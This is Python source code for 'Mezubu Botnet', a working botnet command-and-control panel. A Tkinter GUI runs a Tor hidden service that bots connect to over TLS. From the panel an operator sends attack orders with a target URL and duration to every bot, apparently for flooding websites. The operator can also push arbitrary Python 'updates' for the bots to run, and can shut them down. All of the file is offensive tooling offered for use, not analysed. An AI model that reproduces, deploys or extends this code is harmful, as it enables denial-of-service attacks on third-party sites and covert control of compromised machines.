import hashlib
import socket, socks
import threading
from tkinter import *
from tkinter import messagebox
from tkinter import filedialog
from stem.control import Controller
from PIL import ImageTk, Image
from os import getcwd, path
import ssl
import string, random
import subprocess
from time import sleep
import vlc

numberOfBotsList = list()
tor_password = "PUTTHETORPASSWORDHERE"
server_password = "PUTYOURMEZUBUHASHEDPASSWORDHERE"
hidden_service_dir = getcwd() + '/tor_server/tor/hidden_service_dir'


class Mezubu:
	def __init__(self):
		self.root = Tk()
		self.root.geometry("300x100")
		icon = PhotoImage(height=16, width=16)
		icon.blank()
		self.root.wm_iconphoto(True, icon)
		self.root.title("Password Menu")
		self.root.configure(bg="#303030")
		self.root.resizable(False, False)
		e = Entry(self.root, width=70, bg="#303030", fg='#ffffff', show="*")
		l = Label(self.root, text="Password:", width=60, height=2, bg="#303030", fg='#ffffff')
		button = Button(self.root, text="Submit", fg='#ffffff', command=lambda: self.testPassword(e.get()), width=60, height=3, bg="#383838")
		l.pack()
		e.pack()
		button.pack()
		self.root.mainloop()

	def Tor(self):
		global hidden_service_dir, tor_password
		while not self.torStarted:
			proc1 = subprocess.Popen(["killall", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
			proc1.wait()
			proc2 = subprocess.Popen(["./tor", "-f", "tor_server/torrc"], stdout=subprocess.PIPE)
			for lines in proc2.stdout:
				print(lines.decode("utf-8").strip())
				if lines.decode("utf-8").find("[notice] Bootstrapped 100% (done): Done") != -1:
					self.torStarted = True
					break
				elif lines.decode("utf-8").find("[err] Reading config failed--see warnings above.") != -1:
					self.torStarted = False
		s = socks.socksocket()
		s.set_proxy(socks.SOCKS5, "localhost", 9150)
		with Controller.from_port(port=9151) as controller:
			controller.authenticate(password=tor_password)
			hidden_service = path.join(controller.get_conf('DataDirectory', getcwd()), 'hidden_service_dir')
			controller.create_hidden_service(hidden_service, 80, target_port=5000)
			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			server.bind(("0.0.0.0", 5000))
			server.listen(0)
			while True:
				client_socket, addr = server.accept()
				p = threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True)
				p.start()

	def central(self):
		self.root.destroy()
		global numberOfBotsList
		try:
			self.torStarted = False
			p = threading.Thread(target=self.Tor, daemon=True)
			p.start()
			while not self.torStarted:
				sleep(5)
			self.main = Tk()
			self.main.attributes('-zoomed', True)
			icon = PhotoImage(height=16, width=16)
			icon.blank()
			self.main.wm_iconphoto(True, icon)
			self.main.protocol("WM_DELETE_WINDOW", self.quit)
			self.width = 650
			self.height = 837
			self.aspect_ratio_1 = 650/837
			self.aspect_ratio_2 = 837/650
			self.main.geometry(f"{self.width}x{self.height}")
			self.main.title("Mezubu Botnet")
			self.main.configure(bg="#303030")
			img = Image.open("mezubu.jpg")
			self.image = ImageTk.PhotoImage(img)
			self.label = Label(self.main, image=self.image)
			self.img_copy = img.copy()
			self.label.grid(row=0,column=0, sticky="nswe")
			self.label.bind("<Configure>", self.resize_image)
			turn_on = Button(self.main, text="Attack Target", fg='#ffffff', command=self.attack, height=1, width=91, bg="#383838")
			turn_on.grid(row=1, column=0, sticky="ew")
			turn_on1 = Button(self.main, text="Show Hostname", fg='#ffffff', command=self.hostname, height=1, width=91, bg="#383838")
			turn_on1.grid(row=2, column=0, sticky="ew")
			turn_on2 = Button(self.main, text="Number of Bots", fg='#ffffff', command=self.numberOfBots, height=1, width=91, bg="#383838")
			turn_on2.grid(row=3, column=0, sticky="ew")
			turn_on3 = Button(self.main, text="Play a song", fg='#ffffff', command=lambda: self.song_menu(turn_on3), height=1, width=91, bg="#383838")
			turn_on3.grid(row=4, column=0, sticky="ew")
			turn_on4 = Button(self.main, text="Update Mezubu Botnet", fg='#ffffff', command=self.select_file, height=1, width=91, bg="#383838")
			turn_on4.grid(row=5, column=0, sticky="ew")
			turn_on5 = Button(self.main, text="Quit", fg='#ffffff', command=self.quit, height=1, width=91, bg="#383838")
			turn_on5.grid(row=6, column=0, sticky="ew")
			self.main.grid_columnconfigure(0, weight=1)
			self.main.grid_rowconfigure((0, 1, 2, 3, 4, 5, 6), weight=1)
			self.main.bind("<Configure>", self.on_resize)
			self.main.mainloop()
		except KeyboardInterrupt:
			self.quit()

	def numberOfBots(self):
		global numberOfBotsList
		self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
		self.message_sender(self.get_random_string(128).encode())
		self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
		self.message_sender(self.get_random_string(128).encode())
		botMenu = Tk()
		botMenu.geometry("247x39")
		botMenu.title("Bot menu")
		botMenu.configure(bg="#303030")
		botMenu.resizable(False, False)
		label = Label(botMenu, anchor="n", height=39, width=50, bg="#303030", fg='#ffffff')
		l = Label(botMenu, fg='#ffffff', text="Number Of Bots : " + str(len(numberOfBotsList)), width=60, height=2, bg="#303030")
		l.pack()
		label.pack(expand=False)
		botMenu.mainloop()

	def hostname(self):
		global hidden_service_dir
		hostname = Tk()
		hostname.geometry("500x100")
		hostname.title("Hostname Menu")
		hostname.configure(bg="#303030")
		hostname.resizable(False, False)
		label = Label(hostname, anchor="n", height=39, width=50, bg="#303030")
		e = Entry(hostname, width=70, bg="#303030", fg='#ffffff')
		host = open(hidden_service_dir + "/hostname", "r").read().strip()
		e.insert(0, host)
		l = Label(hostname, text="Hostname", width=60, height=2, bg="#303030", fg='#ffffff')
		l.pack()
		e.pack()
		label.pack(expand=False)
		hostname.mainloop()

	def attack(self):
		attack = Tk()
		attack.geometry("300x180")
		attack.title("Attack Menu")
		attack.configure(bg="#303030")
		attack.resizable(False, False)
		label = Label(attack, anchor="n", height=39, width=50, bg="#303030")
		e = Entry(attack, width=70, bg="#303030", fg='#ffffff')
		l = Label(attack, text="Set target address [ https://example.com ]:", width=60, height=2, bg="#303030", fg='#ffffff')
		f = Label(attack, text="Set time in seconds:", width=60, height=2, bg="#303030", fg='#ffffff')
		h = Entry(attack, width=70, bg="#303030", fg='#ffffff')
		button = Button(attack, text="Attack Target", fg='#ffffff', command=lambda: self.attackTarget(e.get(), h.get()), width=60, height=3, bg="#383838")
		l.pack()
		e.pack()
		f.pack()
		h.pack()
		button.pack()
		label.pack(expand=False)
		attack.mainloop()

	def song_menu(self, turn_on3):
		turn_on3["state"] = "disabled"
		p = threading.Thread(target=self.play, args=("beat.mp3",), daemon=True)
		p.start()

	def play(self, beat):
		proc = subprocess.Popen(["pulseaudio","--start"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
		proc.wait()
		player = vlc.MediaPlayer(beat)
		player.play()
		while True:
			state = player.get_state()
			if state == vlc.State.Ended:
				player = vlc.MediaPlayer(beat)
				player.play()

	def get_random_string(self, length: int):
		letters = string.ascii_lowercase
		result_str = ''.join(random.choice(letters) for i in range(length))
		return result_str

	def handle_client(self, client_socket):
		global numberOfBotsList
		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		context.check_hostname = False
		context.verify_mode = ssl.CERT_NONE
		context.load_verify_locations('cert.pem', 'cert.key')
		my_socket = context.wrap_socket(client_socket, server_side=True)
		numberOfBotsList.append(my_socket)
		print(f"Number of bots: {len(numberOfBotsList)}")

	def testPassword(self, user_p):
		global server_password
		user_p = user_p.encode("utf-8")
		hash_object = hashlib.sha256(user_p)
		password_hash = hash_object.hexdigest()
		if server_password == password_hash:
			self.user_password = user_p
			self.central()
		else:
			messagebox.showerror("Error", "Invalid Password!")

	def on_resize(self, event):
		if event.widget.master:
			return
		new_width_1 = event.width
		new_height_1 = int(new_width_1 / self.aspect_ratio_1)
		new_height_2 = event.height
		new_width_2 = int(new_height_2 / self.aspect_ratio_2)
		if abs(new_width_1 - self.width) > 10 or abs(new_height_1 - self.height) > 10:
			self.width = new_width_1
			self.height = new_height_1
		elif abs(new_height_2 - self.width) > 10 or abs(new_height_2 - self.height) > 10:
			self.width = new_width_2
			self.height = new_height_2
		self.main.geometry(f"{self.width}x{self.height}")

	def resize_image(self,event):
		new_width = event.width
		new_height = event.height
		self.image = self.img_copy.resize((new_width, new_height))
		self.background_image = ImageTk.PhotoImage(self.image)
		self.label.configure(image = self.background_image)

	def quit(self):
		self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
		self.message_sender(self.get_random_string(128).encode() + b"|QUIT|" + self.get_random_string(128).encode())
		exit(0)

	def select_file(self):
		global numberOfBotsList
		filetypes = (
			('text files', '*.py'),
			('All files', '*.*')
		)

		filename = filedialog.askopenfilename(
			title='Open a file',
			initialdir='/',
			filetypes=filetypes)
		try:
			if filename.find(".py") != -1:
				with open(filename, "rb") as f:
					size = path.getsize(filename)
					bytes_read = f.read(size)
					self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
					self.message_sender(self.get_random_string(128).encode() + b"|UPDATE|" + str(size).encode() + b"|UPDATE|" + self.get_random_string(128).encode())
					messagebox.showinfo("Update", "Updating...", icon="info")
					for x in numberOfBotsList:
						try:
							x.sendall(bytes_read)
						except ssl.SSLEOFError:
							numberOfBotsList.remove(x)
				messagebox.showinfo("Update", "Update sent succefully!", icon="info")
			else:
				messagebox.showinfo("Update", "Update failed!", icon="warning")
		except Exception:
			pass

	def attackTarget(self, e, time):
		if (e.find("https://") > -1 or e.find("http://") > -1) and time.isnumeric() and int(time) > 0:
			e = e[:9] + e[9:].split("/")[0]
			self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
			self.message_sender(self.get_random_string(128).encode() + b"|ATTACK|" + e.encode() + b"|ATTACK|" + self.get_random_string(128).encode() + b"|ATTACK|" + time.encode() + b"|ATTACK|" + self.get_random_string(128).encode())
			messagebox.showinfo("Attack", "Attack started successfully!", icon="warning")
		else:
			messagebox.showinfo("Attack", "Attack didn't start!", icon="error")

	def message_sender(self, e):
		global numberOfBotsList
		for x in numberOfBotsList:
			try:
				x.send(e)
			except ssl.SSLEOFError:
				numberOfBotsList.remove(x)

app = Mezubu()
